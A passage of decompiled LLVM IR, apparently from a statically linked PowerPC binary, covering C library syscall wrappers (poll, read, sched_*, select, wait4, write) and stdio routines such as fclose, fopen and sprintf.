  %v0_1000a9d8 = call i32 @__asm_mfcr()
  %v1_1000a9dc = and i32 %v0_1000a9d8, 268435456
  %v3_1000a9dc = icmp eq i32 %v1_1000a9dc, 0
  store i32 %v0_1000a9d8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a9dc, label %dec_label_pc_1000a9f4, label %dec_label_pc_1000a9e8

dec_label_pc_1000a9e8:                            ; preds = %entry
  %v0_1000a9e8 = call i32 @__errno_location()
  %v0_1000a9ec = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a9ec = inttoptr i32 %v0_1000a9e8 to i32*
  store i32 %v0_1000a9ec, i32* %v2_1000a9ec, align 4
  br label %dec_label_pc_1000a9f4

dec_label_pc_1000a9f4:                            ; preds = %entry, %dec_label_pc_1000a9e8
  %v0_1000aa04 = phi i32 [ %v0_1000a9d8, %entry ], [ -1, %dec_label_pc_1000a9e8 ]
  ret i32 %v0_1000aa04

; uselistorder directives
  uselistorder label %dec_label_pc_1000a9f4, { 1, 0 }
}

define i32 @__libc_poll(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000aa20 = call i32 @__asm_mfcr()
  %v1_1000aa24 = and i32 %v0_1000aa20, 268435456
  %v3_1000aa24 = icmp eq i32 %v1_1000aa24, 0
  store i32 %v0_1000aa20, i32* %r31.global-to-local, align 4
  br i1 %v3_1000aa24, label %dec_label_pc_1000aa3c, label %dec_label_pc_1000aa30

dec_label_pc_1000aa30:                            ; preds = %entry
  %v0_1000aa30 = call i32 @__errno_location()
  %v0_1000aa34 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000aa34 = inttoptr i32 %v0_1000aa30 to i32*
  store i32 %v0_1000aa34, i32* %v2_1000aa34, align 4
  br label %dec_label_pc_1000aa3c

dec_label_pc_1000aa3c:                            ; preds = %entry, %dec_label_pc_1000aa30
  %v0_1000aa4c = phi i32 [ %v0_1000aa20, %entry ], [ -1, %dec_label_pc_1000aa30 ]
  ret i32 %v0_1000aa4c

; uselistorder directives
  uselistorder label %dec_label_pc_1000aa3c, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000aa68 = call i32 @__asm_mfcr()
  %v1_1000aa6c = and i32 %v0_1000aa68, 268435456
  %v3_1000aa6c = icmp eq i32 %v1_1000aa6c, 0
  store i32 %v0_1000aa68, i32* %r31.global-to-local, align 4
  br i1 %v3_1000aa6c, label %dec_label_pc_1000aa84, label %dec_label_pc_1000aa78

dec_label_pc_1000aa78:                            ; preds = %entry
  %v0_1000aa78 = call i32 @__errno_location()
  %v0_1000aa7c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000aa7c = inttoptr i32 %v0_1000aa78 to i32*
  store i32 %v0_1000aa7c, i32* %v2_1000aa7c, align 4
  br label %dec_label_pc_1000aa84

dec_label_pc_1000aa84:                            ; preds = %entry, %dec_label_pc_1000aa78
  %v0_1000aa94 = phi i32 [ %v0_1000aa68, %entry ], [ -1, %dec_label_pc_1000aa78 ]
  ret i32 %v0_1000aa94

; uselistorder directives
  uselistorder label %dec_label_pc_1000aa84, { 1, 0 }
}

define i32 @sched_get_priority_max(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000aab0 = call i32 @__asm_mfcr()
  %v1_1000aab4 = and i32 %v0_1000aab0, 268435456
  %v3_1000aab4 = icmp eq i32 %v1_1000aab4, 0
  store i32 %v0_1000aab0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000aab4, label %dec_label_pc_1000aacc, label %dec_label_pc_1000aac0

dec_label_pc_1000aac0:                            ; preds = %entry
  %v0_1000aac0 = call i32 @__errno_location()
  %v0_1000aac4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000aac4 = inttoptr i32 %v0_1000aac0 to i32*
  store i32 %v0_1000aac4, i32* %v2_1000aac4, align 4
  br label %dec_label_pc_1000aacc

dec_label_pc_1000aacc:                            ; preds = %entry, %dec_label_pc_1000aac0
  %v0_1000aadc = phi i32 [ %v0_1000aab0, %entry ], [ -1, %dec_label_pc_1000aac0 ]
  ret i32 %v0_1000aadc

; uselistorder directives
  uselistorder label %dec_label_pc_1000aacc, { 1, 0 }
}

define i32 @sched_get_priority_min(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000aaf8 = call i32 @__asm_mfcr()
  %v1_1000aafc = and i32 %v0_1000aaf8, 268435456
  %v3_1000aafc = icmp eq i32 %v1_1000aafc, 0
  store i32 %v0_1000aaf8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000aafc, label %dec_label_pc_1000ab14, label %dec_label_pc_1000ab08

dec_label_pc_1000ab08:                            ; preds = %entry
  %v0_1000ab08 = call i32 @__errno_location()
  %v0_1000ab0c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ab0c = inttoptr i32 %v0_1000ab08 to i32*
  store i32 %v0_1000ab0c, i32* %v2_1000ab0c, align 4
  br label %dec_label_pc_1000ab14

dec_label_pc_1000ab14:                            ; preds = %entry, %dec_label_pc_1000ab08
  %v0_1000ab24 = phi i32 [ %v0_1000aaf8, %entry ], [ -1, %dec_label_pc_1000ab08 ]
  ret i32 %v0_1000ab24

; uselistorder directives
  uselistorder label %dec_label_pc_1000ab14, { 1, 0 }
}

define i32 @sched_getparam(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000ab40 = call i32 @__asm_mfcr()
  %v1_1000ab44 = and i32 %v0_1000ab40, 268435456
  %v3_1000ab44 = icmp eq i32 %v1_1000ab44, 0
  store i32 %v0_1000ab40, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ab44, label %dec_label_pc_1000ab5c, label %dec_label_pc_1000ab50

dec_label_pc_1000ab50:                            ; preds = %entry
  %v0_1000ab50 = call i32 @__errno_location()
  %v0_1000ab54 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ab54 = inttoptr i32 %v0_1000ab50 to i32*
  store i32 %v0_1000ab54, i32* %v2_1000ab54, align 4
  br label %dec_label_pc_1000ab5c

dec_label_pc_1000ab5c:                            ; preds = %entry, %dec_label_pc_1000ab50
  %v0_1000ab6c = phi i32 [ %v0_1000ab40, %entry ], [ -1, %dec_label_pc_1000ab50 ]
  ret i32 %v0_1000ab6c

; uselistorder directives
  uselistorder label %dec_label_pc_1000ab5c, { 1, 0 }
}

define i32 @sched_getscheduler(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000ab88 = call i32 @__asm_mfcr()
  %v1_1000ab8c = and i32 %v0_1000ab88, 268435456
  %v3_1000ab8c = icmp eq i32 %v1_1000ab8c, 0
  store i32 %v0_1000ab88, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ab8c, label %dec_label_pc_1000aba4, label %dec_label_pc_1000ab98

dec_label_pc_1000ab98:                            ; preds = %entry
  %v0_1000ab98 = call i32 @__errno_location()
  %v0_1000ab9c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ab9c = inttoptr i32 %v0_1000ab98 to i32*
  store i32 %v0_1000ab9c, i32* %v2_1000ab9c, align 4
  br label %dec_label_pc_1000aba4

dec_label_pc_1000aba4:                            ; preds = %entry, %dec_label_pc_1000ab98
  %v0_1000abb4 = phi i32 [ %v0_1000ab88, %entry ], [ -1, %dec_label_pc_1000ab98 ]
  ret i32 %v0_1000abb4

; uselistorder directives
  uselistorder label %dec_label_pc_1000aba4, { 1, 0 }
}

define i32 @sched_setscheduler() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000abd0 = call i32 @__asm_mfcr()
  %v1_1000abd4 = and i32 %v0_1000abd0, 268435456
  %v3_1000abd4 = icmp eq i32 %v1_1000abd4, 0
  store i32 %v0_1000abd0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000abd4, label %dec_label_pc_1000abec, label %dec_label_pc_1000abe0

dec_label_pc_1000abe0:                            ; preds = %entry
  %v0_1000abe0 = call i32 @__errno_location()
  %v0_1000abe4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000abe4 = inttoptr i32 %v0_1000abe0 to i32*
  store i32 %v0_1000abe4, i32* %v2_1000abe4, align 4
  br label %dec_label_pc_1000abec

dec_label_pc_1000abec:                            ; preds = %entry, %dec_label_pc_1000abe0
  %v0_1000abfc = phi i32 [ %v0_1000abd0, %entry ], [ -1, %dec_label_pc_1000abe0 ]
  ret i32 %v0_1000abfc

; uselistorder directives
  uselistorder label %dec_label_pc_1000abec, { 1, 0 }
}

define i32 @sched_yield(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000ac18 = call i32 @__asm_mfcr()
  %v1_1000ac1c = and i32 %v0_1000ac18, 268435456
  %v3_1000ac1c = icmp eq i32 %v1_1000ac1c, 0
  store i32 %v0_1000ac18, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ac1c, label %dec_label_pc_1000ac34, label %dec_label_pc_1000ac28

dec_label_pc_1000ac28:                            ; preds = %entry
  %v0_1000ac28 = call i32 @__errno_location()
  %v0_1000ac2c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ac2c = inttoptr i32 %v0_1000ac28 to i32*
  store i32 %v0_1000ac2c, i32* %v2_1000ac2c, align 4
  br label %dec_label_pc_1000ac34

dec_label_pc_1000ac34:                            ; preds = %entry, %dec_label_pc_1000ac28
  %v0_1000ac44 = phi i32 [ %v0_1000ac18, %entry ], [ -1, %dec_label_pc_1000ac28 ]
  ret i32 %v0_1000ac44

; uselistorder directives
  uselistorder label %dec_label_pc_1000ac34, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000ac60 = call i32 @__asm_mfcr()
  %v1_1000ac64 = and i32 %v0_1000ac60, 268435456
  %v3_1000ac64 = icmp eq i32 %v1_1000ac64, 0
  store i32 %v0_1000ac60, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ac64, label %dec_label_pc_1000ac7c, label %dec_label_pc_1000ac70

dec_label_pc_1000ac70:                            ; preds = %entry
  %v0_1000ac70 = call i32 @__errno_location()
  %v0_1000ac74 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ac74 = inttoptr i32 %v0_1000ac70 to i32*
  store i32 %v0_1000ac74, i32* %v2_1000ac74, align 4
  br label %dec_label_pc_1000ac7c

dec_label_pc_1000ac7c:                            ; preds = %entry, %dec_label_pc_1000ac70
  %v0_1000ac8c = phi i32 [ %v0_1000ac60, %entry ], [ -1, %dec_label_pc_1000ac70 ]
  ret i32 %v0_1000ac8c

; uselistorder directives
  uselistorder label %dec_label_pc_1000ac7c, { 1, 0 }
}

define i32 @__GI_setrlimit(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000aca8 = call i32 @__asm_mfcr()
  %v1_1000acac = and i32 %v0_1000aca8, 268435456
  %v3_1000acac = icmp eq i32 %v1_1000acac, 0
  store i32 %v0_1000aca8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000acac, label %dec_label_pc_1000acc4, label %dec_label_pc_1000acb8

dec_label_pc_1000acb8:                            ; preds = %entry
  %v0_1000acb8 = call i32 @__errno_location()
  %v0_1000acbc = load i32, i32* %r31.global-to-local, align 4
  %v2_1000acbc = inttoptr i32 %v0_1000acb8 to i32*
  store i32 %v0_1000acbc, i32* %v2_1000acbc, align 4
  br label %dec_label_pc_1000acc4

dec_label_pc_1000acc4:                            ; preds = %entry, %dec_label_pc_1000acb8
  %v0_1000acd4 = phi i32 [ %v0_1000aca8, %entry ], [ -1, %dec_label_pc_1000acb8 ]
  ret i32 %v0_1000acd4

; uselistorder directives
  uselistorder label %dec_label_pc_1000acc4, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v3_1000acd8 = icmp eq i32 %arg2, 0
  br i1 %v3_1000acd8, label %dec_label_pc_1000ad18, label %dec_label_pc_1000ad00

dec_label_pc_1000ad00:                            ; preds = %entry
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_1000ad18, label %dec_label_pc_1000ad08

dec_label_pc_1000ad08:                            ; preds = %dec_label_pc_1000ad00
  %v0_1000ad08 = call i32 @__errno_location()
  %v2_1000ad10 = inttoptr i32 %v0_1000ad08 to i32*
  store i32 22, i32* %v2_1000ad10, align 4
  %v0_1000ad3c.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000ad38

dec_label_pc_1000ad18:                            ; preds = %dec_label_pc_1000ad00, %entry
  %v0_1000ad1c = call i32 @__asm_mfcr()
  %v1_1000ad20 = and i32 %v0_1000ad1c, 268435456
  %v3_1000ad20 = icmp eq i32 %v1_1000ad20, 0
  store i32 %v0_1000ad1c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ad20, label %dec_label_pc_1000ad38, label %dec_label_pc_1000ad2c

dec_label_pc_1000ad2c:                            ; preds = %dec_label_pc_1000ad18
  %v0_1000ad2c = call i32 @__errno_location()
  %v0_1000ad30 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ad30 = inttoptr i32 %v0_1000ad2c to i32*
  store i32 %v0_1000ad30, i32* %v2_1000ad30, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000ad38

dec_label_pc_1000ad38:                            ; preds = %dec_label_pc_1000ad18, %dec_label_pc_1000ad08, %dec_label_pc_1000ad2c
  %v0_1000ad3c = phi i32 [ %v0_1000ad1c, %dec_label_pc_1000ad18 ], [ %v0_1000ad3c.pre, %dec_label_pc_1000ad08 ], [ -1, %dec_label_pc_1000ad2c ]
  ret i32 %v0_1000ad3c

; uselistorder directives
  uselistorder label %dec_label_pc_1000ad38, { 2, 0, 1 }
}

define i32 @__libc_sigsuspend(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000ad6c = call i32 @__asm_mfcr()
  %v1_1000ad70 = and i32 %v0_1000ad6c, 268435456
  %v3_1000ad70 = icmp eq i32 %v1_1000ad70, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_1000ad6c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ad70, label %dec_label_pc_1000ad88, label %dec_label_pc_1000ad7c

dec_label_pc_1000ad7c:                            ; preds = %entry
  %v0_1000ad7c = call i32 @__errno_location()
  %v0_1000ad80 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ad80 = inttoptr i32 %v0_1000ad7c to i32*
  store i32 %v0_1000ad80, i32* %v2_1000ad80, align 4
  br label %dec_label_pc_1000ad88

dec_label_pc_1000ad88:                            ; preds = %entry, %dec_label_pc_1000ad7c
  %v0_1000ad98 = phi i32 [ %v0_1000ad6c, %entry ], [ -1, %dec_label_pc_1000ad7c ]
  ret i32 %v0_1000ad98

; uselistorder directives
  uselistorder label %dec_label_pc_1000ad88, { 1, 0 }
}

define i32 @__GI_time(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000adb4 = call i32 @__asm_mfcr()
  %v1_1000adb8 = and i32 %v0_1000adb4, 268435456
  %v3_1000adb8 = icmp eq i32 %v1_1000adb8, 0
  store i32 %v0_1000adb4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000adb8, label %dec_label_pc_1000add0, label %dec_label_pc_1000adc4

dec_label_pc_1000adc4:                            ; preds = %entry
  %v0_1000adc4 = call i32 @__errno_location()
  %v0_1000adc8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000adc8 = inttoptr i32 %v0_1000adc4 to i32*
  store i32 %v0_1000adc8, i32* %v2_1000adc8, align 4
  br label %dec_label_pc_1000add0

dec_label_pc_1000add0:                            ; preds = %entry, %dec_label_pc_1000adc4
  %v0_1000ade0 = phi i32 [ %v0_1000adb4, %entry ], [ -1, %dec_label_pc_1000adc4 ]
  ret i32 %v0_1000ade0

; uselistorder directives
  uselistorder label %dec_label_pc_1000add0, { 1, 0 }
}

define i32 @__libc_wait(i32 %arg1) local_unnamed_addr {
entry:
  %v4_1000adf4 = call i32 @wait4(i32 -1, i32 %arg1, i32 0, i32 0)
  ret i32 %v4_1000adf4
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000ae10 = call i32 @__asm_mfcr()
  %v1_1000ae14 = and i32 %v0_1000ae10, 268435456
  %v3_1000ae14 = icmp eq i32 %v1_1000ae14, 0
  store i32 %v0_1000ae10, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ae14, label %dec_label_pc_1000ae2c, label %dec_label_pc_1000ae20

dec_label_pc_1000ae20:                            ; preds = %entry
  %v0_1000ae20 = call i32 @__errno_location()
  %v0_1000ae24 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ae24 = inttoptr i32 %v0_1000ae20 to i32*
  store i32 %v0_1000ae24, i32* %v2_1000ae24, align 4
  br label %dec_label_pc_1000ae2c

dec_label_pc_1000ae2c:                            ; preds = %entry, %dec_label_pc_1000ae20
  %v0_1000ae3c = phi i32 [ %v0_1000ae10, %entry ], [ -1, %dec_label_pc_1000ae20 ]
  ret i32 %v0_1000ae3c

; uselistorder directives
  uselistorder label %dec_label_pc_1000ae2c, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_1000ae44 = load i32, i32* @r4, align 4
  %v2_1000ae44 = load i32, i32* @r5, align 4
  %v4_1000ae44 = call i32 @wait4(i32 0, i32 %v1_1000ae44, i32 %v2_1000ae44, i32 0)
  ret i32 %v4_1000ae44
}

define i32 @__libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000ae60 = call i32 @__asm_mfcr()
  %v1_1000ae64 = and i32 %v0_1000ae60, 268435456
  %v3_1000ae64 = icmp eq i32 %v1_1000ae64, 0
  store i32 %v0_1000ae60, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ae64, label %dec_label_pc_1000ae7c, label %dec_label_pc_1000ae70

dec_label_pc_1000ae70:                            ; preds = %entry
  %v0_1000ae70 = call i32 @__errno_location()
  %v0_1000ae74 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ae74 = inttoptr i32 %v0_1000ae70 to i32*
  store i32 %v0_1000ae74, i32* %v2_1000ae74, align 4
  br label %dec_label_pc_1000ae7c

dec_label_pc_1000ae7c:                            ; preds = %entry, %dec_label_pc_1000ae70
  %v0_1000ae8c = phi i32 [ %v0_1000ae60, %entry ], [ -1, %dec_label_pc_1000ae70 ]
  ret i32 %v0_1000ae8c

; uselistorder directives
  uselistorder label %dec_label_pc_1000ae7c, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000ae90 = add i32 %arg1, 128
  %v1_1000ae94 = mul i32 %arg1, 2
  %v2_1000ae98 = icmp ugt i32 %v1_1000ae90, 383
  %v0_1000ae9c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1000ae98, i32 %v0_1000ae9c)
  %v3_1000aea4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32 -4224) to i32*), align 4
  %v2_1000aea8 = add i32 %v1_1000ae94, %v3_1000aea4
  %v3_1000aea8 = inttoptr i32 %v2_1000aea8 to i16*
  %v4_1000aea8 = load i16, i16* %v3_1000aea8, align 2
  %v5_1000aea8 = sext i16 %v4_1000aea8 to i32
  ret i32 %v5_1000aea8
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000aec4 = add i32 %tmp, 52
  %v3_1000aec4 = inttoptr i32 %v2_1000aec4 to i32*
  %v4_1000aec4 = load i32, i32* %v3_1000aec4, align 4
  store i32 %v4_1000aec4, i32* @r28, align 4
  %v3_1000aec8 = icmp eq i32 %v4_1000aec4, 0
  store i1 %v3_1000aec8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000aec8, label %dec_label_pc_1000aed0, label %dec_label_pc_1000aef0

dec_label_pc_1000aed0:                            ; preds = %entry
  %v2_1000aed0 = add i32 %tmp, 56
  %v4_1000aee4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32 %v2_1000aed0)
  store i32 268480240, i32* @lr, align 4
  %v1_1000aeec = call i32 @pthread_mutex_lock(i32 %v2_1000aed0)
  %v0_1000aef0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000aef0

dec_label_pc_1000aef0:                            ; preds = %entry, %dec_label_pc_1000aed0
  %v0_1000af00 = phi i32 [ %tmp, %entry ], [ %v0_1000aef0.pre, %dec_label_pc_1000aed0 ]
  %v1_1000aef0 = inttoptr i32 %v0_1000af00 to i16*
  %v2_1000aef0 = load i16, i16* %v1_1000aef0, align 2
  %v3_1000aef0 = zext i16 %v2_1000aef0 to i32
  store i32 0, i32* @r27, align 4
  %v1_1000aef8 = and i32 %v3_1000aef0, 64
  %v3_1000aef8 = icmp eq i32 %v1_1000aef8, 0
  br i1 %v3_1000aef8, label %dec_label_pc_1000af0c, label %dec_label_pc_1000af00

dec_label_pc_1000af00:                            ; preds = %dec_label_pc_1000aef0
  store i32 268480264, i32* @lr, align 4
  %v4_1000af04 = call i32 @fflush_unlocked(i16* %v1_1000aef0, i32 %v1_1000aef8)
  store i32 %v4_1000af04, i32* @r27, align 4
  %v0_1000af0c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000af0c

dec_label_pc_1000af0c:                            ; preds = %dec_label_pc_1000aef0, %dec_label_pc_1000af00
  %v0_1000af0c = phi i32 [ %v0_1000af00, %dec_label_pc_1000aef0 ], [ %v0_1000af0c.pre, %dec_label_pc_1000af00 ]
  %v1_1000af0c = add i32 %v0_1000af0c, 4
  %v2_1000af0c = inttoptr i32 %v1_1000af0c to i32*
  %v3_1000af0c = load i32, i32* %v2_1000af0c, align 4
  store i32 268480276, i32* @lr, align 4
  %v1_1000af10 = call i32 @__libc_close(i32 %v3_1000af0c)
  %v3_1000af14 = icmp eq i32 %v1_1000af10, 0
  store i1 %v3_1000af14, i1* %cr7_eq.global-to-local, align 1
  %tmp8 = icmp sgt i32 %v1_1000af10, -1
  br i1 %tmp8, label %dec_label_pc_1000af20, label %dec_label_pc_1000af1c

dec_label_pc_1000af1c:                            ; preds = %dec_label_pc_1000af0c
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_1000af20

dec_label_pc_1000af20:                            ; preds = %dec_label_pc_1000af0c, %dec_label_pc_1000af1c
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32* @r26, align 4
  store i32 ptrtoint (i32* @global_var_1002ebf8.369 to i32), i32* @r29, align 4
  %v1_1000af34 = load i32, i32* @r31, align 4
  %v2_1000af34 = add i32 %v1_1000af34, 4
  %v3_1000af34 = inttoptr i32 %v2_1000af34 to i32*
  store i32 -1, i32* %v3_1000af34, align 4
  %v2_1000af38 = ptrtoint i32* %stack_var_-40 to i32
  %v0_1000af3c = load i32, i32* @r26, align 4
  %v0_1000af40 = load i32, i32* @r29, align 4
  %v4_1000af48 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_1000af3c, i32 %v0_1000af40)
  %v0_1000af4c = load i32, i32* @r29, align 4
  store i32 268480340, i32* @lr, align 4
  %v1_1000af50 = call i32 @pthread_mutex_lock(i32 %v0_1000af4c)
  %v3_1000af58 = load i32, i32* @global_var_1002f058.370, align 4
  store i32 %v2_1000af38, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_1000af64 = add i32 %v3_1000af58, 1
  store i32 %v1_1000af64, i32* @global_var_1002f058.370, align 4
  store i32 268480368, i32* @lr, align 4
  %v0_1000af6c = call i32 @__pthread_cleanup_pop_restore()
  %v0_1000af70 = load i32, i32* @r31, align 4
  %v1_1000af70 = inttoptr i32 %v0_1000af70 to i16*
  %v2_1000af70 = load i16, i16* %v1_1000af70, align 2
  %v3_1000af70 = zext i16 %v2_1000af70 to i32
  %v0_1000af74 = load i32, i32* @r28, align 4
  %v3_1000af74 = icmp eq i32 %v0_1000af74, 0
  store i1 %v3_1000af74, i1* %cr7_eq.global-to-local, align 1
  %v1_1000af78 = call i32 @__asm_rlwinm(i32 %v3_1000af70, i32 0, i32 17, i32 18)
  %v1_1000af80 = or i32 %v1_1000af78, 48
  %v1_1000af84 = trunc i32 %v1_1000af80 to i16
  %v2_1000af84 = load i32, i32* @r31, align 4
  %v3_1000af84 = inttoptr i32 %v2_1000af84 to i16*
  store i16 %v1_1000af84, i16* %v3_1000af84, align 2
  %v0_1000af88 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000af88, label %dec_label_pc_1000af8c, label %dec_label_pc_1000af98

dec_label_pc_1000af8c:                            ; preds = %dec_label_pc_1000af20
  %v2_1000af8c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000af8c, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268480408, i32* @lr, align 4
  %v0_1000af94 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_1000af98

dec_label_pc_1000af98:                            ; preds = %dec_label_pc_1000af20, %dec_label_pc_1000af8c
  %v0_1000af98 = load i32, i32* @r31, align 4
  %v1_1000af98 = inttoptr i32 %v0_1000af98 to i16*
  %v2_1000af98 = load i16, i16* %v1_1000af98, align 2
  %v1_1000af9c = and i16 %v2_1000af98, 16384
  %v3_1000af9c = icmp eq i16 %v1_1000af9c, 0
  br i1 %v3_1000af9c, label %dec_label_pc_1000afac, label %dec_label_pc_1000afa4

dec_label_pc_1000afa4:                            ; preds = %dec_label_pc_1000af98
  %v1_1000afa4 = add i32 %v0_1000af98, 8
  %v2_1000afa4 = inttoptr i32 %v1_1000afa4 to i32*
  %v3_1000afa4 = load i32, i32* %v2_1000afa4, align 4
  store i32 %v3_1000afa4, i32* @r3, align 4
  store i32 268480428, i32* @lr, align 4
  %v0_1000afa8 = call i32 @free()
  br label %dec_label_pc_1000afac

dec_label_pc_1000afac:                            ; preds = %dec_label_pc_1000af98, %dec_label_pc_1000afa4
  %v0_1000afac = load i32, i32* @r29, align 4
  %v0_1000afb0 = load i32, i32* @r26, align 4
  %v4_1000afb8 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_1000afb0, i32 %v0_1000afac)
  %v0_1000afbc = load i32, i32* @r29, align 4
  store i32 268480452, i32* @lr, align 4
  %v1_1000afc0 = call i32 @pthread_mutex_lock(i32 %v0_1000afbc)
  %v3_1000afc8 = load i16*, i16** @global_var_1002f05c.371, align 4
  %v4_1000afc8 = ptrtoint i16* %v3_1000afc8 to i32
  store i32 %v2_1000af38, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_1000afd4 = add i32 %v4_1000afc8, 1
  %v4_1000afd8 = inttoptr i32 %v1_1000afd4 to i16*
  store i16* %v4_1000afd8, i16** @global_var_1002f05c.371, align 4
  store i32 ptrtoint (i32* @global_var_1000afe0.372 to i32), i32* @lr, align 4
  %v0_1000afdc = call i32 @__pthread_cleanup_pop_restore()
  store i32 268480484, i32* @lr, align 4
  %v0_1000afe0 = call i32 @_stdio_openlist_dec_use()
  %v0_1000afe8 = load i32, i32* @r27, align 4
  ret i32 %v0_1000afe8

; uselistorder directives
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000afac, { 1, 0 }
  uselistorder label %dec_label_pc_1000af98, { 1, 0 }
  uselistorder label %dec_label_pc_1000af20, { 1, 0 }
  uselistorder label %dec_label_pc_1000af0c, { 1, 0 }
  uselistorder label %dec_label_pc_1000aef0, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_1000b004 = call i32 @_stdio_fopen(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_1000b004
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 -1, i32* @r4, align 4
  %v0_1000b014 = call i32 @__GI_vsnprintf()
  ret i32 %v0_1000b014
}

define i32 @sprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  store i32 -1, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_1000b038 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000b038, i32* @r6, align 4
  store i32 2, i32* %stack_var_-104, align 4
